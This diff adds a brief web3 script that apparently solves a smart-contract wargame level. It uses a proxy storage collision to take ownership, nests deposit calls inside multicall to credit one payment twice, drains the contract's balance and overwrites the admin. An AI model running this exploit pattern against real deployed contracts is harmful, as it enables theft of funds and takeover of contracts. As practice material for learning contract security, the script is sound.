@@ -1,0 +1,33 @@
+functionSignature = {
+    name: "proposeNewAdmin",
+    type: "function",
+    inputs: [
+        {
+            type: "address",
+            name: "_newAdmin",
+        },
+    ],
+}
+
+parameters = [player]
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, parameters)
+
+await web3.eth.sendTransaction({
+    from: player,
+    to: instance,
+    data,
+})
+await contract.addToWhitelist(player)
+
+depositData = await contract.methods["deposit()"].request().then((v) => v.data)
+
+multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then((v) => v.data)
+
+await contract.multicall([multicallData, multicallData], {
+    value: toWei("0.001"),
+})
+
+await contract.execute(player, toWei("0.002"), 0x0)
+
+await contract.setMaxBalance(player)
